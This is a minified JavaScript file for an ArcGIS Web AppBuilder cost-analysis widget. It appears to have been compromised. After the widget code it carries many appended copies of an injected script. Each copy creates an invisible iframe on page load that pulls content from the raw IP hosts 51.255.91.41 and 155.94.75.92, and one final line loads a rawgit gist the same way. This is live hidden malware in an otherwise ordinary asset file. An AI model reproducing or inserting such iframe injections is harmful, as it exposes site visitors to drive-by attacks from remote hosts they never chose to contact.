// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/add-new-statistics.html":'\x3cdiv style\x3d"height: 100%; width: 100%;"\x3e\r\n    \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n        \x3c!--Add new statistics label--\x3e\r\n        \x3cdiv class\x3d"esriCTAddNewStatisticsLabel" data-dojo-attach-point\x3d"addNewStatisticsText"\x3e${nls.statisticsSettings.addNewStatisticsText}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"addNewStatisticsNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n        \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButtonNode"\x3e${nls.common.ok}\x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"cancelButtonNode"\x3e${nls.common.cancel}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./add-new-statistics.html dojo/_base/lang dojo/on dojo/dom-construct ./setting/StatisticsSettings dojo/_base/array dojo/query".split(" "),function(f,g,h,k,l,c,d,m,n,p,q){return f([g,h,k],{templateString:l,baseClass:"jimu-widget-cost-analysis-add-new-statistics",_projectOverview:null,_lastConfiguredStatistics:null,addNewStatisticsObj:null,postCreate:function(){this.inherited(arguments);this.addNewStatisticsObj=
this._lastConfiguredStatistics=this._projectOverview=null},startup:function(){this.inherited(arguments);this._lastConfiguredStatistics=c.clone(this.config);this._lastConfiguredStatistics.statisticsSettings=[];this._initAddNewStatistics();this.own(d(this.okButtonNode,"click",c.hitch(this,function(){this._lastConfiguredStatistics.statisticsSettings=this.addNewStatisticsObj.getConfig();this.emit("updateStatisticsDetail",this._getUpdatedStatistics());this.emit("showWorkBenchPanel")})));this.own(d(this.cancelButtonNode,
"click",c.hitch(this,function(){this.emit("showWorkBenchPanel")})))},reset:function(){this._lastConfiguredStatistics=c.clone(this.config);this._lastConfiguredStatistics.statisticsSettings=[];this._initAddNewStatistics();this.emit("updateStatisticsDetail",[])},_initAddNewStatistics:function(){this.addNewStatisticsObj&&this.addNewStatisticsObj.destroy();this.addNewStatisticsObj=new n({nls:this.nls,map:this.map,config:this._lastConfiguredStatistics,layerInfosObj:this.layerInfosObj,showActionButtonsInColumn:!1,
showActionButtonsInRow:!0},m.create("div",{},this.addNewStatisticsNode));this.addNewStatisticsObj.startup();this.addNewStatisticsObj.resetAddNewStatisticsDropdown()},_getUpdatedStatistics:function(){var e,b,d;e=[];d=q(".simple-table-row",this.assetsListNode);p.forEach(d,c.hitch(this,function(a){a.layerNameDropDown&&a.statisticsTypeDropdown&&a.layerFieldDropdown&&a.statisticsLabelTextBox&&(b={},b.id=a.layerNameDropDown.get("value"),b.type=a.statisticsTypeDropdown.get("value"),b.field=a.layerFieldDropdown.get("value"),
b.label=a.statisticsLabelTextBox.get("value"),e.push(b))}));return e}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});